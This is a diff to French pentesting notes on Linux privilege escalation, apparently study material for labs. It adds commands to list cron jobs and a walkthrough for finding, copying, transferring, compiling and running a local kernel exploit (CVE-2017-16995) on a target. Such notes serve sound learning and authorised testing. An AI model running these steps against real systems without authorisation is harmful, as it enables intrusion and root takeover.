@@ -198,7 +198,7 @@ Pré-installé sur Kali dans `/usr/bin/unix-privesc-check`. Transférer sur la c
 ./unix-privesc-check detailed > output.txt
 ```
 
-Chercher les lignes `WARNING` dans l'output — elles indiquent des misconfigurations exploitables (ex: `/etc/passwd` world-writable).
+Chercher les lignes `WARNING` dans l'output - elles indiquent des misconfigurations exploitables (ex: `/etc/passwd` world-writable).
 
 #### linPEAS
 
@@ -290,6 +290,12 @@ sudo tcpdump -i lo -A | grep "pass"
 ## Insecure file permissions
 
 ### Abusing cron jobs
+
+**Lister les jobs cron**
+
+```bash
+cat /etc/crontab; ls -la /etc/cron.*/ ; crontab -l 2>/dev/null
+```
 
 **Identifier les cron jobs root dans les logs**
 
@@ -397,3 +403,42 @@ cat /var/log/syslog | grep <binaire>
 # En tant que root :
 aa-status
 ```
+
+### Exploiting kernel vulnerabilities
+
+**Identifier la version du kernel et l'architecture**
+
+```bash
+cat /etc/issue
+uname -r
+arch
+```
+
+**Chercher un exploit avec searchsploit**
+
+```bash
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
+```
+
+**Copier et inspecter l'exploit**
+
+```bash
+cp /usr/share/exploitdb/exploits/linux/local/45010.c .
+head 45010.c -n 20
+```
+
+Les premières lignes contiennent en général les instructions de compilation.
+
+**Transférer le source sur la cible et compiler**
+
+```bash
+# Kali
+scp cve-2017-16995.c <user>@<ip>:
+
+# Cible
+gcc cve-2017-16995.c -o cve-2017-16995
+file cve-2017-16995
+./cve-2017-16995
+```
+
+Compiler sur la cible évite les problèmes de cross-compilation (bibliothèques, architecture).
